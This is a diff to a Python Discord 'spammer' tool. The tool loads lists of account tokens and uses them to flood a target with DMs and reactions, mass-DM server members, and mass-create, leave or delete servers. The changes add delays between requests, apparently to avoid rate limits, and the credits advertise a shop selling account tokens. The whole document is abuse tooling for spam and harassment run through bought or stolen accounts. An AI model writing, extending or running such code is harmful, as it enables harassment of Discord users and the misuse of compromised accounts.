@@ -35,8 +35,12 @@ try:
 except:
     os.system("pip install requests")
     import requests
+try:
+    from requests import get
+except:
+    os.system("pip install requests")
+    from requests import get
 
-from requests import get
 import threading
 
 try:
@@ -50,6 +54,7 @@ try:
 except:
     os.system("pip install discord")
     import discord
+
 from discord.ext import commands
 
 try:
@@ -327,7 +332,7 @@ def spammer():
             header = mainHeader(token)
 
             payload = {'recipient_id': idd}
-            r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
+            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header,
                                json=payload)
 
             if chrr == 'y':
@@ -341,7 +346,7 @@ def spammer():
             j = json.loads(r1.content)
 
             while True:
-                r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
+                r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                    headers=header, json=payload)
 
                 if r2.status_code == 429:
@@ -356,10 +361,13 @@ def spammer():
         tokens = open("tokens.txt", "r").read().splitlines()
         user = input(f"User ID: ")
         message = input(f"Message: ")
+        delay = int(input('Delay: '))
         chrr = input('Do you want append random string: y/n?: ').lower()
+
 
         def thread():
             for token in tokens:
+                time.sleep(delay)
                 threading.Thread(target=DMSpammer, args=(user, message, token)).start()
 
         start = input(f'Press enter to start: ')
@@ -398,7 +406,7 @@ def spammer():
 
     if choice == '4':
 
-        def reaction(chd, iddd, start, org, token):
+        def reaction(chd, iddd, org, token):
             headers = {'Content-Type': 'application/json',
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
@@ -416,25 +424,22 @@ def spammer():
                        }
 
             emoji = ej.emojize(org, use_aliases=True)
-            if start == '':
-                a = requests.put(
-                    f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
-                    headers=headers)
-                if a.status_code == 204:
-                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
-                else:
-                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")
-
+            a = requests.put(
+                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
+                headers=headers)
+            if a.status_code == 204:
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
             else:
-                print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} ERROR, press only ENTER')
+                print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")
 
         tokens = open('tokens.txt', 'r').read().splitlines()
         chd = input('Channel ID: ')
         iddd = input('Message ID: ')
         emoji = input('Emoji: ')
-        start = input("Press ENTER to start: ")
+        delay = int(input('Delay: '))
         for token in tokens:
-            threading.Thread(target=reaction, args=(chd, iddd, start, emoji, token)).start()
+            time.sleep(delay)
+            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()
 
         time.sleep(5)
         exit = input(f'press any key: ')
@@ -507,7 +512,6 @@ def spammer():
         tuk = []
 
         tokens = open("tokens.txt", "r").read().splitlines()
-
 
         for token in tokens:
             bottuk = discord.Client(status=discord.Status.offline)
@@ -598,6 +602,8 @@ def spammer():
             for i in CoList2:
                 if i:
                     Counter2 += 1
+
+            time.sleep(2)
 
             print(f'There are {Counter} members')
 
@@ -719,6 +725,8 @@ def spammer():
             for i in CoList:
                 if i:
                     Counter += 1
+
+            time.sleep(2)
 
             print(f'There are {Counter} members')
             amountt = int(input('How many members do you wanna DM: '))
@@ -1104,7 +1112,7 @@ def spammer():
                 payload = {
                     'house_id': housefinal
                 }
-                req = requests.delete('https://discord.com/api/v8/hypesquad/online', headers=headers, json=payload)
+                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                 if req.status_code == 204:
                     print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
                 else:
@@ -1605,23 +1613,18 @@ def spammer():
 {Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Send mass DM
 {Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all personal Servers''')
 
-        def generate_random_string(cunt):
-            randstri = "".join(
-                random.choice(string.ascii_letters) for i in range(0, cunt)
-            )
-            return randstri
-
         def servers(token):
             cumt = int(input('How many server you wanna create: '))
+            server_name = input('Servers names: ')
             headers = mainHeader(token)
             for i in range(cumt):
-                payload = {"name": generate_random_string(15)}
+                payload = {"name": server_name}
                 requests.post(
                     "https://discord.com/api/v9/guilds", headers=headers, json=payload
                 )
 
         def remove_friends(token):
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
             rmvfr = requests.get(
                 "https://discord.com/api/v9/users/@me/relationships", headers=headers
             ).json()
@@ -1633,7 +1636,7 @@ def spammer():
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")
 
         def block_friends(token):
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "bruh6/9"}
             json = {"type": 2}
             blck = requests.get(
                 "https://discord.com/api/v9/users/@me/relationships", headers=headers
@@ -1679,10 +1682,10 @@ def spammer():
                            "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                            "stream_notifications_enabled": changset, "status": "dnd",
                            "detect_platform_accounts": changset, "disable_games_tab": changset}
-                requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
+                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
 
         def server_leave(token):
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "bruh6/9"}
             levlservr = requests.get(
                 "https://discord.com/api/v9/users/@me/guilds", headers=headers
             ).json()
@@ -1691,10 +1694,10 @@ def spammer():
                     f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                     headers=headers,
                 )
-                print(f"{Fore.LIGHTGREEN_EX}[+] Left Guild: {serr['id']}{Fore.RESET}")
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Left Guild: {serr['id']}")
 
         def dms_close(token):
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
             clsdms = requests.get(
                 "https://discord.com/api/v9/users/@me/channels", headers=headers
             ).json()
@@ -1706,7 +1709,7 @@ def spammer():
 
         def mass_dm(token):
             message = input('Message: ')
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
             reqmas = requests.get(
                 "https://discord.com/api/v9/users/@me/channels", headers=headers
             ).json()
@@ -1721,7 +1724,7 @@ def spammer():
                 print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} {chen['id']} Sent")
 
         def delete_servers(token):
-            headers = mainHeader(token)
+            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
             print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Deleting...")
             dmms = requests.get(
                 "https://discord.com/api/v9/users/@me/guilds", headers=headers
@@ -1971,10 +1974,12 @@ if __name__ == '__main__':
             if r2.status_code == 204:
                 print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} {UserID} added to group')
 
+
         time.sleep(5)
         exit = input('press any key: ')
         exit = clear()
         exit = spammer()
+
 
     if choice == '23':
         print(f'''{Fore.LIGHTMAGENTA_EX}Wassup buddy. This is fun made tool by Lososik...      
@@ -1984,12 +1989,15 @@ Special thanks to H0LLOW for helping me with a few things.
 Recommended token shop https://sellix.io/Joker-Cat-Tokens
 {Fore.RESET}''')
 
+
         exit = input('press any key: ')
         exit = clear()
         exit = spammer()
 
+
     if choice == '24':
         os.system('exit')
+
 
     else:
         print(f'{Fore.LIGHTRED_EX}Missclick?{Fore.RESET}')
